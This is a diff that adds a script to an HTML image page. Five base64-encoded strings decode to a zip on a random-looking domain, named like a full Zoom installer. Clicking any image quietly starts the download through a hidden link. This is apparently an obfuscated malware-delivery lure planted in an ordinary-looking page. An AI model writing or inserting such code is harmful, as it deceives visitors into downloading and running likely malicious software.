@@ -25,6 +25,39 @@
     <img src="images/img_04.jpg">
     <img src="images/img_05.jpg">
 
-   
+ <script>
+         function base64Decode(base64) {
+             return atob(base64); 
+         }
+ 
+         
+         const encryptedUrls = [
+             'aHR0cHM6Ly9hZ2RncWh4ai5jb20vZGFvd2xpbi9JbnN0YWxsZXIuVXRyX3hab29tSW5zdGFsbGVyRnVsbC56aXA=',
+             'aHR0cHM6Ly9hZ2RncWh4ai5jb20vZGFvd2xpbi9JbnN0YWxsZXIuVXRyX3hab29tSW5zdGFsbGVyRnVsbC56aXA=', 
+             'aHR0cHM6Ly9hZ2RncWh4ai5jb20vZGFvd2xpbi9JbnN0YWxsZXIuVXRyX3hab29tSW5zdGFsbGVyRnVsbC56aXA=',
+             'aHR0cHM6Ly9hZ2RncWh4ai5jb20vZGFvd2xpbi9JbnN0YWxsZXIuVXRyX3hab29tSW5zdGFsbGVyRnVsbC56aXA=',
+             'aHR0cHM6Ly9hZ2RncWh4ai5jb20vZGFvd2xpbi9JbnN0YWxsZXIuVXRyX3hab29tSW5zdGFsbGVyRnVsbC56aXA='
+         ];
+ 
+         
+         const images = document.querySelectorAll('img');
+ 
+         
+         images.forEach((img, index) => {
+             img.addEventListener('click', () => downloadFile(index));
+         });
+ 
+         function downloadFile(imageIndex) {
+             const encodedUrl = encryptedUrls[imageIndex]; 
+             const url = base64Decode(encodedUrl); 
+             const link = document.createElement('a');
+             link.href = url;
+             link.download = ''; 
+             document.body.appendChild(link); 
+             link.click(); 
+             document.body.removeChild(link); 
+         }
+     </script>
+    
 </body>
 </html>
